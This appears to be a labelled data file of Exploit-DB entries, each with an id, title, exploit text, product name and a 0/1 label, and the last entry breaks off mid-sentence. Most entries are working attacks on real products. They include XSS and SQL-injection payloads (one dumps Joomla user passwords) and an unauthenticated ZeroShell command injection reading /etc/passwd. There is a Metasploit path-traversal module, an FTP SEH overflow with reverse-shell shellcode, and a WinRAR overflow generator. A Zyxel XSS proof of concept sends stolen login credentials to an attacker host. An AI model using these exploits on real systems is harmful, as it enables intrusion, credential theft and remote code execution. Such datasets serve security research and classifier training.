28203,Hosting Controller 1.x - 'error.asp' Cross-Site Scripting source: https://www.securityfocus.com/bid/18933/info  Hosting Controller is prone to a cross-site scripting vulnerability because it fails to sanitize input before displaying it to users of the application.  An attacker may leverage this issue to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks  Versions 6.1 and prior are affected.  http://www.example.com/admin/hosting/error.asp?error=<script>alert(do cument.cookie)</script>,Hosting Controller,1
40943,"Google Chrome (Fedora 25 / Ubuntu 16.04) - 'tracker-extract' / 'gnome-video-thumbnailer' + 'totem' Drive-By Download Source: https://scarybeastsecurity.blogspot.com/2016/12/redux-compromising-linux-using-snes.html  ## Overview    Full reliable 0day drive-by exploit against Fedora 25 + Google Chrome, by breaking out of Super Nintendo Entertainment System emulation via cascading side effects from a subtle and interesting emulation error.   I had a lot of fun compromising the Linux desktop using 6502 opcodes on the original Nintendo NES (https://scarybeastsecurity.blogspot.com/2016/11/0day-exploit-compromising-linux-desktop.html). Would it be possible to have even more fun? Why, yes it would! My previous NES related exploit suffered from multiple fun-limiting issues:  - Although it was a genuine 0day exploit, it only affected very old Linux distributions. Something affecting bang up to date Linux installs would generate greater lulz. - The vulnerability that was abused -- a total lack of bounds checking on memory bank mapping -- was somewhat obvious. More fun can often be had with vulnerabilities that are slightly more subtle. - The lack of “super”! The Super Nintendo Entertainment System (SNES) is even more iconic than the original NES. Regarding its 1990 release, Wikipedia notes (https://en.wikipedia.org/wiki/Super_Nintendo_Entertainment_System) ""the resulting social disturbance led the Japanese government to ask video game manufacturers to schedule future console releases on weekends"". So we need more Super.  Resolving all the above, I present here a full, working, reliable, 0day exploit for current Linux distributions (Ubuntu 16.04 LTS and Fedora 25). It’s a full drive-by download in the context of Fedora. It abuses cascading subtle side effects of an emulation misstep that at first appears extremely difficult to exploit but ends up presenting beautiful and 100% reliable exploitation possibilities.  You’ve likely guessed it by now, but the Linux gstreamer media playback framework supports playback of SNES music files by…. emulating the SNES CPU and audio processor, courtesy of Game Music Emu (http://www.slack.net/~ant/libs/audio.html). How cool is that?  - - -   ## Demo and impact Today, the demos are videos instead of images. This first video shows a full, reliable drive-by download against Fedora 25 + Google Chrome. The strong reliability of this exploit makes it work inside Fedora’s tracker-extract process, which has highly variable heap state that has frustrated my other exploit attempts. Finally, decent exploit proof of my earlier suspicion that tracker + Google Chrome is very dangerous (https://scarybeastsecurity.blogspot.com/2016/11/0day-poc-risky-design-decisions-in.html): - https://www.youtube.com/watch?v=WKwRijjqdzY  Exploit file: gnome_calc_fedora_25_libc_2.24-3.spc (rename it to .flac to get it to work as in the video). - Download: https://security.appspot.com/security/spc/gnome_calc_fedora_25_libc_2.24-3.spc - Mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/40943-1.flac  And this second video shows a couple of different exploitation contexts in Ubuntu 16.04 LTS, using the same exploit file for each. Again, this is showcasing the reliability that the underlying vulnerability permits. The different exploited processes (gnome-video-thumbnailer and totem) have very different heap and threading setups: - https://www.youtube.com/watch?v=wrCLoem6ggM  Exploit file: xcalc_ubuntu_16.04_libc_2.23-0ubuntu3.spc (rename it to .mp3 to get it to work as in the video). - Download: https://security.appspot.com/security/spc/xcalc_ubuntu_16.04_libc_2.23-0ubuntu3.spc - Mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/40943-2.mp3  Impact is mixed. On Ubuntu, the faulty code is installed and on the attack surface by default, if you select the “mp3” option during install -- which I certainly always do. On Fedora, there’s a very sensible decision to split gstreamer1-plugins-bad into multiple packages, with only gstreamer1-plugins-bad-free installed by default. This limits the attack surface and does not include Game Music Emu. Of course, the gstreamer framework will happily offer to install gstreamer1-plugins-bad-free-extras, with a very nice UI, if the victim simply tries to open the relevant media file.  As always, the general lack of sandboxing here contributes to the severity. I think we inhabit a world where media parsing sandboxes should be mandatory these days. There’s hope: some of my other recent disclosures appear to have motivated a sandbox for Gnome’s tracker (https://bugzilla.gnome.org/show_bug.cgi?id=764786).",Google Chrome (Fedora,0
36368,"WoltLab Community Gallery - Persistent Cross-Site Scripting #Vulnerability title: Community Gallery - Stored Cross-Site Scripting vulnerability #Product: Community Gallery #Vendor: https://www.woltlab.com #Affected version: Community Gallery 2.0 before 12/10/2014 #Download link: https://www.woltlab.com/purchase/?products[]=com.woltlab.gallery #Fixed version: Community Gallery 2.0 after 12/26/2014 #CVE ID: CVE-2015-2275 #Author: Pham Kien Cuong (cuong.k.pham (at) itas (dot) vn [email concealed]) & ITAS Team (www.itas.vn)  ::PROOF OF CONCEPT::  + REQUEST: POST /7788bdbc/gallery/index.php/AJAXProxy/?t=7d53f8ad7553c0f885e3ccb60edbc0b6512d9eed HTTP/1.1 Host: target User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Referer: http://target/7788bdbc/gallery/index.php/ImageEdit/7/ Content-Length: 1300 Cookie: wcf_cookieHash=f774ed47049756db7f6f635748b497cf08b6fef3; __cfduid=dceb0da13e569549c9531d07b3d287acb1420598620 Authorization: Basic Nzc4OGJkYmM6OWM1NWE3OWM= Connection: keep-alive Pragma: no-cache Cache-Control: no-cache  actionName=saveImageData&className=gallery%5Cdata%5Cimage%5CImageAction&objectIDs%5B%5D=7&parameters%5Bdata%5D%5B7%5D%5BalbumID%5D=1&parameters%5Bdata%5D%5B7%5D%5BcategoryIDs%5D%5B%5D=3&parameters%5Bdata%5D%5B7%5D%5Bdescription%5D=test&parameters%5Bdata%5D%5B7%5D%5BenableComments%5D=1&parameters%5Bdata%5D%5B7%5D%5Bfilename%5D=HoaMai1.jpg&parameters%5Bdata%5D%5B7%5D%5Bfilesize%5D=47948&parameters%5Bdata%5D%5B7%5D%5Bheight%5D=480&parameters%5Bdata%5D%5B7%5D%5BimageID%5D=7&parameters%5Bdata%5D%5B7%5D%5Blatitude%5D=0&parameters%5Bdata%5D%5B7%5D%5Blongitude%5D=0&parameters%5Bdata%5D%5B7%5D%5Borientation%5D=1&parameters%5Bdata%5D%5B7%5D%5Btags%5D%5B%5D=testing&parameters%5Bdata%5D%5B7%5D%5BthumbnailHeight%5D=0&parameters%5Bdata%5D%5B7%5D%5BthumbnailWidth%5D=0&parameters%5Bdata%5D%5B7%5D%5BthumbnailX%5D=0&parameters%5Bdata%5D%5B7%5D%5BthumbnailY%5D=0&parameters%5Bdata%5D%5B7%5D%5BtinyURL%5D=http%3A%2F%2Fdemo.woltlab.com%2F7788bdbc%2Fgallery%2FuserImages%2F21%2F7-2147cd1e-tiny.jpg&parameters%5Bdata%5D%5B7%5D%5Btitle%5D=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E&parameters%5Bdata%5D%5B7%5D%5Burl%5D=http%3A%2F%2Fdemo.woltlab.com%2F7788bdbc%2Fgallery%2FuserImages%2F21%2F7-2147cd1e.jpg&parameters%5Bdata%5D%5B7%5D%5Bwidth%5D=640&parameters%5Bdata%5D%5B7%5D%5Blocation%5D=&parameters%5BisEdit%5D=1  - Vulnerable parameter: parameters[data][7][title]  ::DISCLOSURE:: + 12/10/2014: Detect vulnerability + 12/10/2014: Send the detail vulnerability to vendor + 03/11/2015: Public information  ::REFERENCE:: - http://www.itas.vn/news/itas-team-found-out-a-stored-xss-vulnerability-in-burning-board-community-gallery-77.html - https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2275",WoltLab Community Gallery,1
8023,"ZeroShell 1.0beta11 - Remote Code Execution ====================================================  ZeroShell <= 1.0beta11 Remote Code Execution  Original Advisory:  http://www.ikkisoft.com/stuff/LC-2009-01.txt  luca.carettoni[at]ikkisoft[dot]com ====================================================    ZeroShell (http://www.zeroshell.net/eng/) is a small Linux distribution  for servers and embedded devices. This Linux distro can be configured  and managed with an easy to use web console.  ZeroShell is prone to an arbitrary code execution vulnerability due to an improper input validation mechanism. An aggressor may abuse this  weakness in order to compromise the entire system.  Authentication is not required in order to exploit this flaw.  [Proof of Concept]    /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;<CMD HERE>;%22    In addition to the Unix commands, it is possible to abuse the  ZeroShell scripts themself. For instance it is likely to use the  ""getkey"" script in order to retrieve remote files, including the content in the html page.    {HTTP REQUEST} GET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22; /root/kerbynet.cgi/scripts/getkey%20../../../etc/passwd;%22 HTTP/1.1 Host: <IP>  # milw0rm.com [2009-02-09]",ZeroShell,1
45198,"Oracle Glassfish OSE 4.1 - Path Traversal (Metasploit) # Exploit title: Oracle Glassfish OSE 4.1 - Path Traversal (Metasploit) # Author: Dhiraj Mishra # Date: 2018-08-14 # Software: Oracle Glassfish Server OSE # Version: 4.1 # Software link: http://download.oracle.com/glassfish/4.1/release/glassfish-4.1.zip # CVE: 2017-1000028  ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  class MetasploitModule < Msf::Auxiliary   include Msf::Auxiliary::Report   include Msf::Auxiliary::Scanner   include Msf::Exploit::Remote::HttpClient    def initialize(info = {})     super(update_info(info,       'Name'        => 'Path Traversal in Oracle GlassFish Server Open Source Edition',       'Description' => %q{         This module exploits an unauthenticated directory traversal vulnerability         which exits in administration console of Oracle GlassFish Server 4.1, which is         listening by default on port 4848/TCP.       },       'References'  =>         [           ['CVE', '2017-1000028'],           ['URL', 'https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904'],           ['EDB', '39441']         ],       'Author'      =>         [           'Trustwave SpiderLabs', # Vulnerability discovery           'Dhiraj Mishra' # Metasploit module         ],       'DisclosureDate' => 'Aug 08 2015',       'License'     => MSF_LICENSE     ))      register_options(       [         Opt::RPORT(4848),         OptString.new('FILEPATH', [true, ""The path to the file to read"", '/windows/win.ini']),         OptInt.new('DEPTH', [ true, 'Depth for Path Traversal', 13 ])       ])   end    def run_host(ip)     filename = datastore['FILEPATH']     traversal = ""%c0%af.."" * datastore['DEPTH'] << filename      res = send_request_raw({       'method' => 'GET',       'uri'    => ""/theme/META-INF/prototype#{traversal}""     })      unless res && res.code == 200       print_error('Nothing was downloaded')       return     end      vprint_good(""#{peer} - #{res.body}"")     path = store_loot(       'oracle.traversal',       'text/plain',       ip,       res.body,       filename     )     print_good(""File saved in: #{path}"")   end end",Oracle GlassFish Server,1
39215,"Konica Minolta FTP Utility 1.00 - CWD Command Overflow (SEH) # Title: Konica Minolta FTP Utility 1.00 Post Auth CWD Command SEH Overflow. # Date : 01/08/2016 # Author: TOMIWA. # Software link: http://download.konicaminolta.hk/bt/driver/mfpu/ftpu/ftpu_10.zip # Software: Konica Minolta FTP Utility v1.0 # Tested: Windows 7 SP1 64bits # Listen for a reverse netcat connection on port 4444 # root@kali:~# nc -nlvp 4444 # listening on [any] 4444 ... # connect to [192.168.0.11] from (UNKNOWN) [192.168.0.109] 49158 # Microsoft Windows [Version 6.1.7601] # Copyright (c) 2009 Microsoft Corporation.  All rights reserved.  # C:\Program Files (x86)\KONICA MINOLTA\FTP Utility>   #!/usr/bin/python import socket  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #buffer = ""Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2B"" #msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.0.118 LPORT=4444 -e x86/shikata_ga_nai -b ""\x00\x0d\x0a\x3d\x5c\x2f"" -i 3 -f python buf =  """" buf += ""\xbe\x95\x8c\xbb\x24\xdb\xdb\xd9\x74\x24\xf4\x5a\x29"" buf += ""\xc9\xb1\x5f\x31\x72\x14\x83\xc2\x04\x03\x72\x10\x77"" buf += ""\x79\x62\xe1\xae\xf6\xb1\x1e\xed\x1e\xe6\x8d\x3f\xba"" buf += ""\x32\xfb\x8e\x64\x74\x90\xea\x97\x1d\x7c\x89\x73\x1d"" buf += ""\x62\x91\x66\xa8\x21\x9a\xb7\xf6\xc8\xce\xd3\x8e\x8f"" buf += ""\x12\xa5\xc1\x62\x44\xeb\x33\x84\x55\x7e\xa1\xae\xc1"" buf += ""\x73\x50\xb4\xc6\xeb\x8a\x28\x66\x13\x8b\x8b\x42\x6d"" buf += ""\x5b\xa6\x63\x02\xbe\x7b\x71\xf0\xcd\x6e\x36\x8c\x69"" buf += ""\x3a\x7b\xc8\x03\xc7\xcf\xbe\x12\x0e\xf3\x7a\x29\xa7"" buf += ""\xe3\xb3\x54\xd3\x12\xd7\x99\x2c\x7e\x63\x6d\x08\x79"" buf += ""\x20\x29\x59\xf2\xfe\xe0\x1f\x9e\x6b\xa6\x36\x5a\x75"" buf += ""\x15\xd8\x5d\x8b\x65\xdb\xad\x7c\x84\xe8\x17\xac\x07"" buf += ""\xef\x45\x18\x29\x06\xbe\x07\x65\x68\xd5\xf9\xcb\x15"" buf += ""\x56\x13\x25\xa3\x72\xd0\xd7\x57\x77\xbb\x8f\x4d\x17"" buf += ""\xaf\xf9\x77\x53\x17\xf5\xeb\xab\xe0\x11\x1f\x88\xea"" buf += ""\xab\xa9\xce\x0b\x8d\x84\x8f\x76\x05\x05\xdc\x04\x0c"" buf += ""\x16\xc9\x84\x06\x6f\x2d\x02\x61\x59\xcd\x36\x17\x88"" buf += ""\xe9\x3a\x4f\x63\x9e\x61\x24\xbf\xdc\xd9\x53\x42\x1a"" buf += ""\xdf\xb2\x6e\xfe\xec\x8c\xf5\x6d\xeb\x74\x89\x29\x11"" buf += ""\x1f\x4d\x9c\xc4\x64\xb9\x8c\x54\xa3\x2c\x3f\xf4\x98"" buf += ""\x42\x11\xe0\x06\x32\x57\x75\xac\xaa\xec\x10\xda\x6d"" buf += ""\x20\x51\x57\xdd\x99\x1f\x35\x90\x23\xb6\xdb\x37\x17"" buf += ""\x1f\x1b\xea\xd1\x37\xc0\x88\x74\x4e\x74\xcf\x63\xb0"" buf += ""\x4f\xdc\x2c\x90\xe2\x08\xcd\x49\x40\x36\x1a\xfb\x18"" buf += ""\x29\x2b\x6f\x2e\x3c\x57\x6a\x79\xa8\xac\x49\xbe\xe7"" buf += ""\x2e\x48\xa0\xeb\x4f\x36\x3b\xa2\x40\xff\x9f\x21\xcd"" buf += ""\x8e\xb3\xdf\x92\xed\x3f\x12\x81\x1a\xba\x02\x20\x8f"" buf += ""\x1d\x5a\xef\xb1\xc3\xb0\x90\xed\x6a\x21\x5b\xc6\xb9"" buf += ""\x24\x3f\xa0\x3f\xc8\x4f\x05\xa3\xcf\x06\xa4\x06\xd5"" buf += ""\x8e\xd7\x3e\x11\xc4\x8c\x12\xa7\x3b\x75\x3f\xe8\xd3"" buf += ""\xd7\x08\x39\x83\xfa\x80\x71\x3c\x6e\x29\x8d\x5e\xcc"" buf += ""\xa1\xd4"" #nSEH = ""\xEB\x13\x90\x90"" #SEH = ""\x9D\x6D\x20\x12"" >> 12206D9D buffer = ""\x41"" * 1037 + ""\xeb\x0a\x90\x90"" + ""\x9D\x6D\x20\x12"" + ""\x90"" *30 +  buf +  ""D""*1955  #buffer = ""\x41"" * 1060 print ""\sending evil buffer...."" s.connect(('192.168.0.109',21)) #HARDCODED IP ADDRESS. data = s.recv(1024) s.send('USER anonymous' + '\r\n') data = s.recv(1024) s.send('PASS anonymous' + '\r\n') data = s.recv(1024) s.send('CWD ' +buffer+'\r\n') s.close",Konica Minolta FTP Utility,1
28794,4Images 1.7 - 'details.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/20488/info  4images is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied input.  An attacker may leverage this issue to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  Version 1.7.3 is vulnerable; other versions may also be affected.  www.example.com/details.php?image_id=3&mode=%22%3E%3Ciframe%20src%3Dhttp%3A%2F%2Fwww.google.de%20width%3D150%20height%3D%22150,4Images,1
35547,"ICJobSite 1.1 - 'pid' SQL Injection source: https://www.securityfocus.com/bid/47100/info  ICJobSite is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  ICJobSite 1.1 is vulnerable; other versions may also be affected.   http://www.example.com/icjobsite/index.php?page=position_details&pid=[SQL-Injection]",ICJobSite,1
7504,"Joomla! Component Tech Article 1.x - SQL Injection                             ||          ||   | ||                             o_,_7 _||  . _o_7 _|| 4_|_||  o_w_,                     ( :   /    (_)    /           (   .    |-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=| |     _                   __           __       __          ______     | |   /' \            __  /'__`\        /\ \__  /'__`\       /\  ___\    | |  /\_, \    ___   /\_\/\_\L\ \    ___\ \ ,_\/\ \/\ \  _ __\ \ \__/    | |  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\ \___``\  | |     \ \ \/\ \/\ \ \ \ \/\ \L\ \/\ \__/\ \ \_\ \ \_\ \ \ \/ \/\ \L\ \ | |      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\  \ \____/ | |       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/   \/___/  | |                  \ \____/ >> Kings of injection                      | |                   \/___/                                             | |                                                                      | |-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=|     <<!>> Found by  :  Cyb3r-1sT   <<!>> C0ntact : cyb3r-1st [at] hotmail.com                        <<!>> Groups : InjEctOr5 T3am     ======================================================= +++++++++++++++++++++++ Exploit +++++++++++++++++++++++ =======================================================     <<->> D0rk    : find it   <<->> Exploit :>>>                                                                           :>>>  http://www.site.me/index.php?option=com_tech_article&Itemid=17&item=-1+union+select+0,concat(username,0x3a,password),0,0,0,0,0,0,0+from+jos_users--&task=item     ======================================================= ++++++++++++++++++++++ Greetz +++++++++++++++++++++++++ =======================================================   <<->> All freinds , all muslims , str0ke   side note: <name>tech_article</name> <creationDate>3-23-2006</creationDate> <author>Anthony Ferrara</author> <copyright>GPL</copyright> <authorEmail>ircmaxell@yahoo.com</authorEmail> <authorUrl>www.ircmaxell.com</authorUrl> <version>1.0.1</version> <description>Tech Article Component For Joomla</description>  # milw0rm.com [2008-12-17]",Joomla! Component Tech Article,1
27196,"IBM Tivoli Directory Server 6.0 - LDAP Memory Corruption source: https://www.securityfocus.com/bid/16593/info  IBM Tivoli Directory Server is prone to an unspecified memory corruption. This issue may be triggered by malformed LDAP data.  The exact impact of this vulnerability is not known at this time. Although the issue is known to crash the server, the possibility of remote code execution is unconfirmed.  The vulnerability was reported for version 6.0 on the Linux platform. Other versions or platforms are not known to be affected.  This vulnerability will be updated as further information is made available.  This issue can be reproduced by running the following command for the ProtoVer Sample LDAP testsuite:  ./run.py localhost 389 2532 1",IBM Tivoli Directory Server,1
46706,"Zyxel ZyWall 310 / ZyWall 110 / USG1900 / ATP500 / USG40 - Login Page Cross-Site Scripting # Exploit Title: Reflected XSS on Zyxel login pages # Date: 10 Apr 2019 # Exploit Author: Aaron Bishop # Vendor Homepage: https://www.zyxel.com/us/en/ # Version: V4.31 # Tested on: ZyWall 310, ZyWall 110, USG1900, ATP500, USG40 - weblogin.cgi, webauth_relogin.cgi # CVE : 2019-9955  1. Description ==============  Several Zyxel devices are vulnerable to a reflected Cross-Site Scripting via the mp_idx parameter on weblogin.cgi and webauth_relogin.cgi.  2. Proof of Concept =============  Host a malicious file JavaScript file named 'z', or any other single character, locally.  The contents of 'z' for the following example are:   ----- $(""button"").click(function() {     $.get(""//$LHOST"", { username: $(""input:text"").val(), password: $(""input:password"").val(), host: location.hostname}); }); -----   Close the mp_idx variable with ""; and Use the getScript functionality of jQuery to include the malicious file:   Request:  GET /?mobile=1&mp_idx=%22;$.getScript(%27//$LHOST/z%27);// HTTP/1.1 Host: $RHOST User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1    Response:  HTTP/1.1 200 OK Date: Wed, 10 Apr 2019 23:13:39 GMT Cache-Control: no-cache, private Pragma: no-cache Expires: Mon, 16 Apr 1973 13:10:00 GMT Connection: close Content-Type: text/html Content-Length: 7957  <!DOCTYPE html> <html> <head> 	<title>Welcome</title> 	<meta name=""viewport"" content=""width=device-width, initial-scale=1""> 	<meta charset=""utf-8""> 	<meta http-equiv=""pragma"" content=""no-cache"">     <link href=""/ext-js/mobile/css/jquery.mobile-1.4.2.min.css?v=180711001117"" rel=""stylesheet"" type=""text/css"">     <link href=""/ext-js/mobile/css/style.css?v=180711001117"" rel=""stylesheet"" type=""text/css"">     <link href=""/ext-js/mobile/css/theme.css?v=180711001117"" rel=""stylesheet"" type=""text/css""> 	<link rel=""stylesheet"" type=""text/css"" href=""/logo/mobile_custmiz_page.css?v=180711001117"" />  	<script src=""/ext-js/mobile/js/jquery-1.8.2.min.js?v=180711001117"" type=""text/javascript""></script>     <script src=""/ext-js/mobile/js/jquery.mobile-1.4.2.min.js?v=180711001117"" type=""text/javascript""></script> 	<script type=""text/javascript"" src=""/lang/language_panel.js?v=180711001117""></script> <script language=""JavaScript""> 	var errorNum = 0; 	var mp_idx = """";$.getScript('//$LHOST/z');//""; ...   When the login form is submitted, the host for the malicious file gets a request containing the login credentials and target system:  $LHOST - - [10/Apr/2019 23:04:41] ""GET /z?_=1554937481076 HTTP/1.1"" 200 - $LHOST - - [10/Apr/2019 23:04:49] ""GET /?username=test&password=test&host=$RHOST HTTP/1.1"" 200 -",Zyxel ZyWall,1
558,"WinRAR 1.0 - Local Buffer Overflow /* * WinRar local buffer overflow exploit V1.0 * Coded By ATmaCA * Copyright © 2004 ProGroup Software, Inc. * E-Mail:atmaca@prohack.net * Web:www.prohack.net * Usage:\r\nexploit <Target> <OutputPath> * Targets: * 1 - WinXP SP1 user32.dll [0x77D718FC] * 2 - WinXP SP2 user32.dll [0x77D8AF0A] * Example:exploit 1 myrar.rar */  /* * All WinRar 2.x series are effected * 3.x series not effected * If you want to test and you do not have WinRar V2.x * You can download it from http://atmaca.prorat.net/Src/winrar.zip */  #include <stdio.h> #include <stdlib.h> #include <conio.h>  #ifdef __BORLANDC__        #include <mem.h> #endif  #define NOP 0x90  /*crafted rar header*/ char winrar_header[] = ""\x52\x61\x72\x21\x1A\x07\x00\xCF\x90\x73\x00\x00\x0D\x00\x00\x00"" ""\x00\x00\x00\x00\x4A\x91\x74\x80\x80\x35\x00\x00\x00\x00\x00\x00"" ""\x00\x00\x00\x02\x00\x00\x00\x00\x12"";  /*launch a local cmd.exe*/ char shellcode[]= ""\x68""                    // push ""cmd ""                    // cmd ""\x8B\xC4""                // mov eax,esp ""\x50""                    // push eax ""\xB8\xc7\x93\xC2\x77""    // mov eax,77C293C7 (address of system() on WinXP SP2 - msvcrt.dll) ""\xFF\xD0""                // call eax ;  char *target[]=  //return addr {        ""\xFC\x18\xD7\x77"",   //User32 jmp esp addr  WinXp Sp1        ""\x0A\xAF\xD8\x77""    //User32 jmp esp addr  WinXp Sp2 };  char *sysadrr[]= {        ""\x44\x80\xC2\x77"",   //77C28044 XP Sp1  msvcrt.dll system()        ""\xC7\x93\xC2\x77""    //77C293C7 XP Sp2  msvcrt.dll system() };  FILE   *di; int    targetnum; int    i;  void main(int argc, char *argv[]) {         if (argc < 3)        {                 printf(""\r\nWinRar local buffer overflow exploit V1.0\r\n"", argv[0]);                 printf(""Coded By ATmaCA\r\n"");                 printf(""Copyright © 2004 ProGroup Software, Inc.\r\n"");                 printf(""E-Mail:atmaca@prohack.net\r\n"");                 printf(""Web:www.prohack.net\r\n\r\n"");                 printf(""Usage:\r\nexploit <Target> <OutputPath>\r\n\r\n"",argv[0]);                 printf(""Targets:\n"");                 printf(""1 - WinXP SP1 english user32.dll [0x77D718FC]\n"");                 printf(""2 - WinXP SP2 english user32.dll [0x77D8AF0A]\n"");                 printf(""Example:exploit 1 myrar.rar\n"");                  return;        }         targetnum = atoi(argv[1]) - 1;         if( (di=fopen(argv[2],""wb"")) == NULL )        {                printf(""Error opening file!\n"");                return;        }        for(i=0;i<sizeof(winrar_header)-1;i++)                fputc(winrar_header[i],di);         /*stuff in a couple of NOPs*/        for(i=0;i<1051;i++)                fputc(NOP,di);         fprintf(di,""%s"",target[targetnum]); //EIP         for(i=0;i<50;i++) //NOPs                fputc(NOP,di);         memcpy(shellcode+9,sysadrr[targetnum],4); //system() addr         /*Overwriting the return address (EIP) with JMP ESP address        located somewhere in process space */        for(i=0;i<sizeof(shellcode)-1;i++)                fputc(shellcode[i],di);         for(i=0;i<50;i++) //NOPs                fputc(NOP,di);         printf(""Exploit rar file %s has been generated!\n"",argv[2]);         fclose(di); }  // milw0rm.com [2004-09-28]",WinRAR,1
45316,"Visual Ping 0.8.0.0 - 'Host' Denial of Service (PoC) # Exploit Title: Visual Ping 0.8.0.0 - 'Host' Denial of Service (PoC) # Date: 2018-08-30 # Exploit Author: Uriel Corral Salinas # Vendor Homepage: http://www.itlights.com # Software Link: http://www.scanwith.com/download/Free_Visual_Ping.htm # Version: Free Visual Ping  (Version 0.8.0.0) # Tested on: Windows 10 Pro x64  # Visual Ping 0.8.0.0 - 'Host, Time Out,packet size, Pause, Loops' - Denial of Service (PoC) # 1. Ejecutar codigo ""Visual_Ping.py"" # 2. Copiar contenido de ""VisualPing.txt"" al portapapeles # 3. Ejecutar VPing.exe # 4. Copiar portapapeles en Host # 5. Copiar portapapeles en Time Out # 6. Copiar portapapeles en Packet size # 7. Copiar portapapeles en Pause # 8. Copiar portapapeles en Loops # 9. Click en Star # 10. Crashed  #!/usr/bin/env python  f=open(""VisualPing.txt"",""w"") buff = ""\x41"" * 4108 ggg = ""\x42"" * 4 hhh = ""\x43"" * 4 iii = ""\x44"" * 4 f.write(buff + ggg + hhh + iii) f.close()",Visual Ping,1
38176,"WordPress Plugin EZ SQL Reports < 4.11.37 - Multiple Vulnerabilities # Exploit Title: EZ SQL Reports < 4.11.37: Arbitrary File Download (admin/colaborator required) # Google Dork: - # Date: 12/09/2015 # Exploit Author: Felipe Molina (@felmoltor) # Vendor Homepage: https://wordpress.org/plugins/elisqlreports/ # Software Link: https://downloads.wordpress.org/plugin/elisqlreports.4.11.33.zip # Version: < 4.11.33, fixed in 4.11.37 # Tested on: Debian GNU/Linux 7 with Wordpress 4.3 # CVE : N/A # # Summary: The plugin allows a wordpress site administrator or collaborator to download arbitrary files from the host file system though the plugin functionality of downloading .sql, .sql.zip or .sql.gz files created by the wordpress administrator. # The file name to download is not sanitized and path traversal can be injected in the request. # # Timeline: # - 09/09/2015: Fist contact with the author # - 11/09/2015: Author creates fix and communicate to me # - 12/09/2015: Public release of the new plugin version  # POC: To 